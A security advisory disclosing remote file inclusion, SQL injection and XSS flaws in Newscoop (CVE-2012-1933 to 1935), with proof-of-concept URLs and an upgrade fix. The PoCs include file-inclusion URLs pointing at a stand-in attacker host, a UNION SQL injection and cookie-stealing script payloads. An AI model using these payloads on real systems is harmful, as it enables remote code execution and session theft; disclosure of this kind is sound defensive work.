Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in Newscoop, which can be exploited to perform Remote File Inclusion, SQL Injection and Cross-Site Scripting (XSS) attacks.


1) Multiple Remote File Inclusion in Newscoop: CVE-2012-1933

1.1 Input passed via the "GLOBALS[g_campsiteDir]" GET parameter to /include/phorum_load.php is not properly verified before being used in require_once() function and can be exploited to include arbitrary remote files.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/include/phorum_load.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00

1.2 Input passed via the "GLOBALS[g_campsiteDir]" GET parameter to /conf/install_conf.php is not properly verified before being used in require_once() function and can be exploited to include arbitrary remote files.

The following PoC demonstrates the vulnerability:

http://[host]/conf/install_conf.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00

1.3 Input passed via the "GLOBALS[g_campsiteDir]" GET parameter to /conf/liveuser_configuration.php is not properly verified before being used in require_once() function and can be exploited to include arbitrary remote files.

The following PoC demonstrates the vulnerability:

http://[host]/conf/liveuser_configuration.php?GLOBALS[g_campsiteDir]=http://attacker.site/file%00

Successful exploitation of these vulnerabilities (1.1 - 1.3) requires that "register_globals" is enabled.


2) SQL Injection in Newscoop: CVE-2012-1934

2.1 Input passed via the "f_country_code" GET parameter to /admin/country/edit.php is not properly sanitised before being used in SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/admin/country/edit.php?f_country_code=%27%20union%20select%201,2,version%28%29%20--%202

Successful exploitation of the vulnerability requires attacker to be registered and logged-in and to have permission to manage countries. For successful exploitation "magic_quotes_gpc" should be disabled as well.


3) Multiple Cross-Site Scripting (XSS) in Newscoop: CVE-2012-1935

3.1 Input passed via the "Back" GET parameter to /admin/ad.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of the affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/admin/ad.php?Back=%27%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

3.2 Input passed via the "error_code" GET parameter to /admin/login.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/login.php?error_code=upgrade&f_user_name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

3.3 Input passed via the "token" and "f_email" GET parameters to /admin/password_check_token.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of the affected website.

The following PoC demonstrate the vulnerabilities:

http://[host]/admin/password_check_token.php?token=1&f_email=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admin/password_check_token.php?f_email=1&token=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Solution:

Upgrade to Newscoop 3.5.5
Make sure that "register_globals" is set to off (fix for CVE-2012-1933)
